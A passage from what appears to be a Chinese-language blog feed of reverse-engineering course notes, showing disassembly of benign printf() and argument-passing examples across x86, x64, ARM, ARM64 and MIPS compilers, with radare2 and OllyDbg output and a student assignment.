0</span><br><span class="line">|       |   0x0000073c      e87ffeffff     call sym.imp.printf         ; int printf(const char *format)</span><br><span class="line">|      ,==&lt; 0x00000741      eb0c           jmp 0x74f</span><br><span class="line">|      ||      ; JMP XREF from 0x00000729 (main)</span><br><span class="line">|      |`-&gt; 0x00000743      488d3db90000.  lea rdi, str.What_you_entered__Huh_ ; 0x803 ; &quot;What you entered? Huh?&quot;</span><br><span class="line">|      |    0x0000074a      e861feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|      |       ; JMP XREF from 0x00000741 (main)</span><br><span class="line">|      `--&gt; 0x0000074f      b800000000     mov eax, 0</span><br><span class="line">|           0x00000754      c9             leave</span><br><span class="line">\           0x00000755      c3             ret</span><br><span class="line">[0x000006fa]&gt; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="其他系统"><a href="#其他系统" class="headerlink" title="其他系统"></a>其他系统</h3><p>关于ARM、MIPS系统对于printf()函数的处理，请各位同学参考《RE4B》一书</p>
<p>#作业</p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——printf()</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94printf().html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><h3 id="三个参数"><a href="#三个参数" class="headerlink" title="三个参数"></a>三个参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;a=%d; b=%d; c=%d&quot;, 1, 2, 3);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="九个参数"><a href="#九个参数" class="headerlink" title="九个参数"></a>九个参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;a=%d; b=%d; c=%d; d=%d; e=%d; f=%d; g=%d; h=%d\n&quot;, 1, 2, 3, 4, 5, 6, 7, 8);</span><br><span class="line">	return 0; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们用这个程序来演示它的参数传递过程。</p>
<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><h4 id="x86：传递3个参数"><a href="#x86：传递3个参数" class="headerlink" title="x86：传递3个参数"></a>x86：传递3个参数</h4><h5 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h5><p>使用 MSVC 2010 express 编译上述程序，可得到下列汇编指令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SG3830 DB		&#x27;a=%d; b=%d; c=%d’, 00H</span><br><span class="line">...</span><br><span class="line">	push 3</span><br><span class="line">	push 2</span><br><span class="line">	push 1</span><br><span class="line">	push OFFSET $SG3830 </span><br><span class="line">	call _printf</span><br><span class="line">	add esp, 16		;00000010H</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<p>这与最初的 Hello World 程序相差不多。我们看到 printf()函数的<code>参数以逆序存入栈</code>里，第一个参数在最后入栈。<br>在 32 位环境下，<code>32 位地址指针和 int 类型数据都占据 32 位/4 字节空间</code>。所以，我们这里的四个参数 总共占用 4×4&#x3D;16(字节)的存储空间。<br>在调用函数之后，<code>ADD ESP, X</code>指令修正ESP寄存器中的栈指针。通常情况下，我们可以<code>通过call 之后的这条指令判断参数的数量:变量总数=X÷4</code>。<br>这种判断方法仅适用于调用约定为cdecl的程序。</p>
<p>如果某个程序连续地调用多个函数，且调用函数的指令之间不夹杂其他指令，那么编译器可能把释放参数存储空间的<code>ADD ESP,X</code>指令进行合并，一次性地释放所有空间。例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push a1 </span><br><span class="line">push a2 </span><br><span class="line">call ... </span><br><span class="line">...</span><br><span class="line">push a1 </span><br><span class="line">call ... </span><br><span class="line">...</span><br><span class="line">push a1 </span><br><span class="line">push a2 </span><br><span class="line">push a3 </span><br><span class="line">call ... </span><br><span class="line">add esp, 24</span><br></pre></td></tr></table></figure>
<h5 id="使用OllyDBG调试"><a href="#使用OllyDBG调试" class="headerlink" title="使用OllyDBG调试"></a>使用OllyDBG调试</h5><p>将MSVC编译成的文件放进OD，并通过设置断点的方式，我们可以来到main()函数处（此前需要跳过多处ntdll、crt等代码）。main()函数如图：<br><img src="/images/ee176c1db39c51e60a8d0eea845ce5a1efb237fd.png" alt="屏幕快照 2017-12-04 下午12.13.00.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">004115D0    55              push ebp</span><br><span class="line">004115D1    8BEC            mov ebp,esp</span><br><span class="line">004115D3    83EC 40         sub esp,0x40</span><br><span class="line">004115D6    53              push ebx</span><br><span class="line">004115D7    56              push esi</span><br><span class="line">004115D8    57              push edi</span><br><span class="line">004115D9    6A 03           push 0x3</span><br><span class="line">004115DB    6A 02           push 0x2</span><br><span class="line">004115DD    6A 01           push 0x1</span><br><span class="line">004115DF    68 305B4100     push ConsoleA.00415B30                   ; ASCII &quot;a=%d, a=%d, c=%d&quot;</span><br><span class="line">004115E4    E8 83FCFFFF     call ConsoleA.0041126C</span><br><span class="line">004115E9    83C4 10         add esp,0x10</span><br><span class="line">004115EC    33C0            xor eax,eax                              ; ucrtbase.__argc</span><br><span class="line">004115EE    5F              pop edi                                  ; ConsoleA.00411A5E</span><br><span class="line">004115EF    5E              pop esi                                  ; ConsoleA.00411A5E</span><br><span class="line">004115F0    5B              pop ebx                                  ; ConsoleA.00411A5E</span><br><span class="line">004115F1    8BE5            mov esp,ebp</span><br><span class="line">004115F3    5D              pop ebp                                  ; ConsoleA.00411A5E</span><br></pre></td></tr></table></figure>
<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><h4 id="x64：传递3个参数"><a href="#x64：传递3个参数" class="headerlink" title="x64：传递3个参数"></a>x64：传递3个参数</h4><h5 id="使用radare2调试"><a href="#使用radare2调试" class="headerlink" title="使用radare2调试"></a>使用radare2调试</h5><p>使用gcc编译源代码，之后使用radare2进行调试，结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/re# r2 a.out </span><br><span class="line">[0x00000540]&gt; aaa</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[0x00000540]&gt; s main</span><br><span class="line">[0x0000064a]&gt; pdf</span><br><span class="line">            ;-- main:</span><br><span class="line">/ (fcn) sym.main 43</span><br><span class="line">|   sym.main ();</span><br><span class="line">|              ; DATA XREF from 0x0000055d (entry0)</span><br><span class="line">|           0x0000064a      55             push rbp</span><br><span class="line">|           0x0000064b      4889e5         mov rbp, rsp</span><br><span class="line">|           0x0000064e      b903000000     mov ecx, 3</span><br><span class="line">|           0x00000653      ba02000000     mov edx, 2</span><br><span class="line">|           0x00000658      be01000000     mov esi, 1</span><br><span class="line">|           0x0000065d      488d3da00000.  lea rdi, qword str.a__d__b__d__c__d_n ; 0x704 ; &quot;a=%d, b=%d, c=%d\n&quot;</span><br><span class="line">|           0x00000664      b800000000     mov eax, 0</span><br><span class="line">|           0x00000669      e8b2feffff     call sym.imp.printf         ; int printf(const char *format)</span><br><span class="line">|           0x0000066e      b800000000     mov eax, 0</span><br><span class="line">|           0x00000673      5d             pop rbp</span><br><span class="line">\           0x00000674      c3             ret</span><br><span class="line">[0x0000064a]&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="x64：传递9个参数"><a href="#x64：传递9个参数" class="headerlink" title="x64：传递9个参数"></a>x64：传递9个参数</h4><p>GCC编译，使用radare2调试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/re# ./a.out </span><br><span class="line">a=1; b=2; c=3; d=4; e=5; f=6; g=7; h=8</span><br><span class="line">root@kali:~/re# r2 ./a.out </span><br><span class="line">[0x00000540]&gt; aaa</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[0x00000540]&gt; s main</span><br><span class="line">[0x0000064a]&gt; pdf</span><br><span class="line">            ;-- main:</span><br><span class="line">/ (fcn) sym.main 69</span><br><span class="line">|   sym.main ();</span><br><span class="line">|              ; DATA XREF from 0x0000055d (entry0)</span><br><span class="line">|           0x0000064a      55             push rbp</span><br><span class="line">|           0x0000064b      4889e5         mov rbp, rsp</span><br><span class="line">|           0x0000064e      4883ec08       sub rsp, 8</span><br><span class="line">|           0x00000652      6a08           push 8</span><br><span class="line">|           0x00000654      6a07           push 7</span><br><span class="line">|           0x00000656      6a06           push 6</span><br><span class="line">|           0x00000658      41b905000000   mov r9d, 5</span><br><span class="line">|           0x0000065e      41b804000000   mov r8d, 4</span><br><span class="line">|           0x00000664      b903000000     mov ecx, 3</span><br><span class="line">|           0x00000669      ba02000000     mov edx, 2</span><br><span class="line">|           0x0000066e      be01000000     mov esi, 1</span><br><span class="line">|           0x00000673      488d3d9e0000.  lea rdi, qword str.a__d__b__d__c__d__d__d__e__d__f__d__g__d__h__d_n ; 0x718 ; &quot;a=%d; b=%d; c=%d; d=%d; e=%d; f=%d; g=%d; h=%d\n&quot;</span><br><span class="line">|           0x0000067a      b800000000     mov eax, 0</span><br><span class="line">|           0x0000067f      e89cfeffff     call sym.imp.printf         ; int printf(const char *format)</span><br><span class="line">|           0x00000684      4883c420       add rsp, 0x20</span><br><span class="line">|           0x00000688      b800000000     mov eax, 0</span><br><span class="line">|           0x0000068d      c9             leave</span><br><span class="line">\           0x0000068e      c3             ret</span><br><span class="line">[0x0000064a]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="其他系统"><a href="#其他系统" class="headerlink" title="其他系统"></a>其他系统</h3><p>关于ARM、MIPS系统对于printf()函数的处理，请各位同学参考《RE4B》一书。有能力的同学可自行编译分析。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>调用函数的时候，程序参数的传递过程大体如下：</p>
<h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">push 	3rd argument</span><br><span class="line">push 	2nd argument</span><br><span class="line">push 	1st argument</span><br><span class="line">call 	function</span><br><span class="line">; modify stack pointer if needed</span><br></pre></td></tr></table></figure>
<h3 id="x64-msvc"><a href="#x64-msvc" class="headerlink" title="x64 - msvc"></a>x64 - msvc</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov	rcx,	1st argument</span><br><span class="line">mov	rdx,	2nd argument</span><br><span class="line">mov	r8,	3rd argument</span><br><span class="line">mov	r9,	4th argument</span><br><span class="line">...</span><br><span class="line">push	5th, 6th argument, etc</span><br><span class="line">call	function</span><br><span class="line">; modify stack pointer if needed</span><br></pre></td></tr></table></figure>
<h3 id="x64-gcc"><a href="#x64-gcc" class="headerlink" title="x64 - gcc"></a>x64 - gcc</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov	rdi, 1st argument</span><br><span class="line">mov	rsi, 2nd argument</span><br><span class="line">mov	rdx, 3rd argument</span><br><span class="line">mov	rcx, 4th argument</span><br><span class="line">mov	r8, 5th argument</span><br><span class="line">mov	r9, 6th argument</span><br><span class="line">...</span><br><span class="line">push	7th, 8th argument, etc</span><br><span class="line">call function</span><br><span class="line">; modify stack pointer if needed</span><br></pre></td></tr></table></figure>
<h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov	r0, 1st argument</span><br><span class="line">mov	r1, 2nd argument</span><br><span class="line">mov	r2, 3rd argument</span><br><span class="line">mov	r3, 4th argument</span><br><span class="line">; pass 5th, 6th argument, etc</span><br><span class="line">bl		function</span><br><span class="line">; modify stack pointer if needed, IN STACK</span><br></pre></td></tr></table></figure>
<h3 id="ARM64"><a href="#ARM64" class="headerlink" title="ARM64"></a>ARM64</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov	x0, 1st argument</span><br><span class="line">mov	x1, 2nd argument</span><br><span class="line">mov	x2, 3rd argument</span><br><span class="line">mov	x3, 4th argument</span><br><span class="line">mov	x4, 5th argument</span><br><span class="line">mov	x5, 6th argument</span><br><span class="line">mov	x6, 7th argument</span><br><span class="line">; pass 9th, 10th argument, etc, IN STACK</span><br><span class="line">bl		function</span><br><span class="line">; modify stack pointer if needed</span><br></pre></td></tr></table></figure>
<h3 id="MIPS-O32调用约定"><a href="#MIPS-O32调用约定" class="headerlink" title="MIPS - O32调用约定"></a>MIPS - O32调用约定</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li	$4, 1st  argument		;$a0</span><br><span class="line">li	$5, 2nd argument		;$a1</span><br><span class="line">li	$6, 3rd argument		;$a2</span><br><span class="line">li	$7, 4th argument		;$a3</span><br><span class="line">; pass 5th, 6th argument, etc, IN STACK</span><br><span class="line">lw	temp_reg, address of function</span><br><span class="line">jalr	temp_reg</span><br></pre></td></tr></table></figure>

<h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><p>选择一个源代码，在gcc或msvc上编译，并用<code>ollydbg</code>或<code>radare2</code>或<code>gdb</code>或<code>IDA</code>进行分析。</p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——参数获取、返回值、指针、GOTO语句</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E5%8F%82%E6%95%B0%E8%8E%B7%E5%8F%96%E3%80%81%E8%BF%94%E5%9B%9E%E5%80%BC%E3%80%81%E6%8C%87%E9%92%88%E3%80%81GOTO%E8%AF%AD%E5%8F%A5.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="参数获取"><a href="#参数获取" class="headerlink" title="参数获取"></a>参数获取</h2><p>示例程序如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span> <span class="params">( <span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a*b+c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">f</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><h4 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h4><p>MSVC编译后的指令清单如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_TEXT	SEGMENT</span><br><span class="line">_a$ = 8		; size = 4</span><br><span class="line">_b$ = 12	; size = 4</span><br><span class="line">_c$ = 16	; size = 4</span><br><span class="line">_f		PROC</span><br><span class="line">			push	ebp</span><br><span class="line">			mov		ebp,esp</span><br><span class="line">			mov		eax, DWORD PTR _a$[ebp]</span><br><span class="line">			imul		eax, DWORD PTR _b$[ebp]</span><br><span class="line">			add		eax, DWORD PTR _c$[ebp]</span><br><span class="line">			pop		ebp</span><br><span class="line">			ret		0</span><br><span class="line">_f		ENDP</span><br><span class="line"></span><br><span class="line">_main	PROC</span><br><span class="line">			push	ebp</span><br><span class="line">			push	ebp,esp</span><br><span class="line">			push	3		; 3rd argument</span><br><span class="line">			push	2		; 2nd argument</span><br><span class="line">			push	1		; 1st argument</span><br><span class="line">			call	_f</span><br><span class="line">			add		esp, 12</span><br><span class="line">			push	eax</span><br><span class="line">			push	OFFSET $SG2463		; &#x27;$d&#x27;, 0aH, 00H</span><br><span class="line">			call	_printf</span><br><span class="line">			add		esp, 8</span><br><span class="line">			; return 0</span><br><span class="line">			xor		eax, eax</span><br><span class="line">			pop		ebp</span><br><span class="line">			ret		0</span><br><span class="line">_main	ENDP</span><br></pre></td></tr></table></figure>

<p>main()函数把 3 个数字推送入栈，然后调用了<code>f(int, int, int)</code>。被调用方函数f()通过<code>_a$=8</code>一类的汇编宏访问所需参数以及函数自定义的局部变量。只不过从被调用方函数的数据栈的角度来看，<code>外部参考的偏移量是正值</code>，而<code>局部变量的偏移量是负值</code>。可见，当需要访问栈帧(stack frame)以外的数据时，被调用方函数可把汇编宏(例如_a$)与EBP寄存器的值<code>相加</code>，从而求得所需地址。<br>当变量 a 的值存入<code>EAX</code>寄存器之后，f()函数通过各参数的地址依次进行乘法和加法运算，运算结果 一直存储于 EAX 寄存器。此后 EAX 的值就可以直接作为返回值传递给调用方函数。调用方函数 main()再 把 EAX 的值当作参数传递给 printf()函数。</p>
<h4 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h4><p>GCC编译结果和MSVC基本相同。如果函数尾声使用了<code>leave</code>指令，则不需要被调用房函数还原栈指针<code>sp</code>。</p>
<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><h4 id="MSVC-1"><a href="#MSVC-1" class="headerlink" title="MSVC"></a>MSVC</h4><p>x86-64系统能够使用<code>寄存器传递参数</code>（一般为前4个或前6个），被调用方函数会从寄存器里获取参数，而不需要访问栈。<br>开启优化：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SG2997	DB	&#x27;%d&#x27;, 0aH, 00H</span><br><span class="line"></span><br><span class="line">main	PROC</span><br><span class="line">			sub	rsp, 40</span><br><span class="line">			mov	edx, 2</span><br><span class="line">			lea	r8d, QWORD PTR [rdx+1]		; r8d=3</span><br><span class="line">			lea	ecx, QWORD PTR [rdx-1]		; ecx=1</span><br><span class="line">			call	f</span><br><span class="line">			lea	rcx, OFFSET FLAT:$SG2997	; &#x27;%d&#x27;</span><br><span class="line">			mov	edx, eax</span><br><span class="line">			call	printf</span><br><span class="line">			xor	eax,eax</span><br><span class="line">			add	rsp, 40</span><br><span class="line">			ret	0</span><br><span class="line">main	ENDP</span><br><span class="line"></span><br><span class="line">f	PROC</span><br><span class="line">		; ECX - 1st argument</span><br><span class="line">		; EDX - 2nd argument</span><br><span class="line">		; R8D - 3rd argument</span><br><span class="line">		imul	ecx,edx</span><br><span class="line">		lea	eax,DWORD PTR [r8+rcx]</span><br><span class="line">		ret	0</span><br><span class="line">f	ENDP</span><br></pre></td></tr></table></figure>
<p>我们可以看到，f()函数通过<code>寄存器</code>获取了全部的所需参数。此处求址的加法运算是通过<code>LEA</code>指令实现 的。很明显，编译器认为 LEA 指令的效率比 ADD 指令的效率高，所以它分配了 LEA 指令。在制备 f()函 数的第一个和第三个参数时，main()函数同样使用了 LEA 指令。编译器无疑认为 LEA 指令向寄存器赋值 的速度比常规的 MOV 指令速度快。</p>
<p>未开启优化：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f   proc near</span><br><span class="line">    ; shadow space:</span><br><span class="line">    arg_0 = dword ptr 8</span><br><span class="line">    arg_8 = dword ptr 10h</span><br><span class="line">    arg_10 = dword ptr 18h</span><br><span class="line">    ; ECX - 1st argument</span><br><span class="line">    ; EDX - 2nd argument</span><br><span class="line">    ; R8D - 3rd argument</span><br><span class="line">    mov [rsp+arg_10], r8d     </span><br><span class="line">    mov [rsp+arg_8], edx</span><br><span class="line">    mov [rsp+arg_0], ecx</span><br><span class="line">    mov eax, [rsp+arg_0]</span><br><span class="line">    imul eax, [rsp+arg_8]</span><br><span class="line">    add eax, [rsp+arg_10]</span><br><span class="line">    retn</span><br><span class="line">f endp</span><br><span class="line"></span><br><span class="line">main  proc near</span><br><span class="line">    sub rsp, 28h</span><br><span class="line">    mov r8d,3 ; 3rd argument</span><br><span class="line">    mov edx,2 ; 2nd argument</span><br><span class="line">    mov ecx,1 ; 1st argument</span><br><span class="line">    call f</span><br><span class="line">    mov edx, eax</span><br><span class="line">    lea rcx, $SG2931 ; &quot;%d\n&quot; </span><br><span class="line">    call printf</span><br><span class="line">    ; return 0</span><br><span class="line">    xor eax, eax </span><br><span class="line">    add rsp, 28h </span><br><span class="line">    retn</span><br><span class="line">main  endp</span><br></pre></td></tr></table></figure>
<p>比较意外的是，原本位于寄存器的 3 个参数都被推送到了栈里。这种现象叫作<code>阴影空间/shadow space</code> 。 每个Win64程序都可以(但非必须)把 4 个寄存器的值保存到阴影空间里。<br>使用阴影空间有以下两个优点: </p>
<ol>
<li>通过栈传递参数，可避免浪费寄存器资源(有时可能会占用 4 个寄存器);</li>
<li>便于调试器debugger在程序中断时找到函数参数</li>
</ol>
<p>大型函数可能会把输入参数保存在阴影空间里，但是小型函数(如本例)可能就不会使用阴影空间了。<br>在使用阴影空间时，由<code>调用方</code>函数分配栈空间，由被调用方函数根据需要将寄存器参数转储到它们的阴影空间中。</p>
<h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><h4 id="未开启优化的："><a href="#未开启优化的：" class="headerlink" title="未开启优化的："></a>未开启优化的：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000A4 0030A0E1 MOV R3, R0</span><br><span class="line">.text:000000A8 932120E0 MLA R0, R3, R1, R2</span><br><span class="line">.text:000000AC 1EFF2FE1 BX  LR</span><br><span class="line">... </span><br><span class="line">.text:000000B0 				main</span><br><span class="line">.text:000000B0 10402DE9 STMFD SP!, &#123;R4,LR&#125;</span><br><span class="line">.text:000000B4 0320A0E3 MOV R2, #3</span><br><span class="line">.text:000000B8 0210A0E3 MOV R1, #2</span><br><span class="line">.text:000000BC 0100A0E3 MOV R0, #1</span><br><span class="line">.text:000000C0 F7FFFFEB BL f</span><br><span class="line">.text:000000C4 0040A0E1 MOV R4, R0</span><br><span class="line">.text:000000C8 0410A0E1 MOV R1, R4</span><br><span class="line">.text:000000CC 5A0F8FE2 ADR R0, aD_0 ; &quot;%d\n&quot;</span><br><span class="line">.text:000000D0 E31800EB BL __2printf</span><br><span class="line">.text:000000D4 0000A0E3 MOV R0, #0</span><br><span class="line">.text:000000D8 0000A0E3 LDMFD SP!, &#123;R4,PC&#125;</span><br></pre></td></tr></table></figure>
<p>主函数只起到了调用另外 2 个函数的作用。它把 3 个参数传递给了f()函数。<br>在 ARM 系统里，前 4 个寄存器<code>R0~R3</code>负责传递前 4 个参数。<br>在本例中，f()函数通过前 3 个寄存器(R0~R2)读取参数。</p>
<p><code>MLA(Multiply Accumulate)</code>指令将前两个操作数(R3 和 R1 里的值)相乘，然后再计算第三个操作数(R2 里的值)和这个积的和，并且把最终运算结果存储在零号寄存器 R0 之中。根据 ARM 指令的有关 规范，<code>返回值</code>就应该存放在 <code>R0</code> 寄存器里。<br>首条指令<code>MOV R3, R0</code>属于冗余指令。即使此处没有这条指令，后面的 MLA 指令直接使用有关的 寄存器也不会出现任何问题。</p>
<p><code>BL</code>指令把程序的控制流交给<code>LR</code>寄存器里的地址，而且会在必要的时候切换处理器的运行模式(Thumb 模式和ARM模式之间进行模式切换)。被调用方函数f()并不知道它会被什么模式的代码调用，不知道调用方函数属于 ARM模式的代码还是Thumb模式的代码。所以这种模式切换的功能还是必要的。如果它被 Thumb模式的代码调用，BX指令不仅会进行相应的跳转，还会把处理器模式调整为Thumb。如果它被ARM 模式的指令调用，则不会进行模式切换。</p>
<h4 id="开启优化的："><a href="#开启优化的：" class="headerlink" title="开启优化的："></a>开启优化的：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000098							f</span><br><span class="line">.text:00000098 91 20 20 E0		MLA R0, R1, R0, R2 .text:0000009C 1E FF 2F E1		BX LR</span><br></pre></td></tr></table></figure>
<p>在启用最大幅度的优化功能(<code>-O3</code>)之后，前面那条 MOV 指令被优化了，或者说被删除了。MLA 直接使用所有寄存器的参数，并且把返回值保存在 R0 寄存器里。调用方函数继而可从 R0 寄存器获取返回值。</p>
<h4 id="开启优化的Thumb模式："><a href="#开启优化的Thumb模式：" class="headerlink" title="开启优化的Thumb模式："></a>开启优化的Thumb模式：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000005E 48 43		MULS R0, R1</span><br><span class="line">.text:00000060 80 18		ADDS R0, R0, R2</span><br><span class="line">.text:00000062 70 47		BX LR</span><br></pre></td></tr></table></figure>
<p>因为 Thumb 模式的指令集里没有 MLA 指令，所以编译器将它分为两个指令。第一条 MULS 指令计算 R0 和 R1 的积，把运算结果存储在 R1 寄存器里。第二条 ADDS 计算 R1 和 R2 的和，并且把计算结果存储在 R0 寄存器里。</p>
<h3 id="ARM64"><a href="#ARM64" class="headerlink" title="ARM64"></a>ARM64</h3><h4 id="开启优化的GCC"><a href="#开启优化的GCC" class="headerlink" title="开启优化的GCC"></a>开启优化的GCC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f:</span><br><span class="line">		madd	w0, w0, w1, w2</span><br><span class="line">		ret</span><br><span class="line">main: </span><br><span class="line">; save FP and LR to stack frame:</span><br><span class="line">		stp x29, x30, [sp, -16]! </span><br><span class="line">		mov w2, 3</span><br><span class="line">		mov w1, 2</span><br><span class="line">		add x29, sp, 0</span><br><span class="line">		mov w0, 1</span><br><span class="line">		bl f</span><br><span class="line">		mov w1, w0</span><br><span class="line">		adrp x0, .LC7</span><br><span class="line">		add x0, x0, :lo12:.LC7 bl printf</span><br><span class="line">; return 0</span><br><span class="line">		mov w0, 0</span><br><span class="line">; restore FP and LR</span><br><span class="line">		ldp x29, x30, [sp], 16</span><br><span class="line">		ret</span><br><span class="line">.LC7:</span><br><span class="line">		.string &quot;%d\n&quot;</span><br></pre></td></tr></table></figure>
<p>ARM64 的情况简单一些。<code>MADD</code> 指令可以一次进行乘法和加法的混合运算，与前文的 MLA 指令十 分类似。全部 3 个参数由 X-字头寄存器的低 32 位传递。这是因为这些参数都是 32 位整型数据。函数的返 回值存储在 <code>W0</code> 寄存器。</p>
<blockquote>
<p>采用 64 位参数之后，程序使用了整个 64 位 <code>X 寄存器</code>。程序通过<code>两条指令</code>才能把长数据类型的 64 位值存储到寄存器里。</p>
</blockquote>
<h4 id="未开启优化的GCC"><a href="#未开启优化的GCC" class="headerlink" title="未开启优化的GCC"></a>未开启优化的GCC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f:</span><br><span class="line">		sub sp, sp, #16</span><br><span class="line">		str w0, [sp,12] </span><br><span class="line">		str w1, [sp,8] </span><br><span class="line">		str w2, [sp,4] </span><br><span class="line">		ldr w1, [sp,12] </span><br><span class="line">		ldr w0, [sp,8] </span><br><span class="line">		mul w1, w1, w0 l</span><br><span class="line">		dr w0, [sp,4] </span><br><span class="line">		add w0, w1, w0 </span><br><span class="line">		add sp, sp, 16</span><br><span class="line">		ret</span><br></pre></td></tr></table></figure>
<p>函数 f()把传入的参数保存在数据栈里，以防止后期的指令占用<code>W0~W2 寄存器</code>。这可防止后续指令覆盖函数参数，起到保护传入参数的作用。这种技术叫作<code>寄存器保护区/Register Save Area</code>。 但是，本例的这种被调用方函数可以不这样保存参数。<br>在启用优化选项后，GCC会把这部分寄存器存储指令删除。这是因为优化功能判断出后续指令不会再操作函数参数的相关地址，所以编译器不再另行保存 W0~W2 中存储的数据。<br>此外，上述代码使用了 <code>MUL/ADD</code> 指令对，而没有使用 MADD 指令。</p>
<h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000	f:</span><br><span class="line">; $a0=a</span><br><span class="line">; $a1=b</span><br><span class="line">; $a2=c</span><br><span class="line">.text:00000000 mult		$a1, $a0</span><br><span class="line">.text:00000004 mflo		$v0</span><br><span class="line">.text:00000008 jr			$ra</span><br><span class="line">.text:0000000C addu		$v0, $a2, $v0		; branch delay slot</span><br><span class="line">; result in $v0 upon return</span><br><span class="line">text:00000010		main:</span><br><span class="line">.text:00000010 </span><br><span class="line">.text:00000010 var_10	= -0x10</span><br><span class="line">.text:00000010 var_4	= -4</span><br><span class="line">.text:00000010 </span><br><span class="line">.text:00000010 lui		$gp, (__gnu_local_gp &gt;&gt; 16)</span><br><span class="line">.text:00000014 addiu	$sp, -0x20</span><br><span class="line">.text:00000018 la		$gp, (__gnu_local_gp &amp; 0xFFFF)</span><br><span class="line">.text:0000001C sw		$ra, 0x20+var_4($sp)</span><br><span class="line">.text:00000020 sw		$gp, 0x20+var_10($sp)</span><br><span class="line">; set c: </span><br><span class="line">.text:00000024 li		$a2, 3</span><br><span class="line">; set a: </span><br><span class="line">.text:00000028 li		$a0, 1</span><br><span class="line">.text:0000002C jal		f</span><br><span 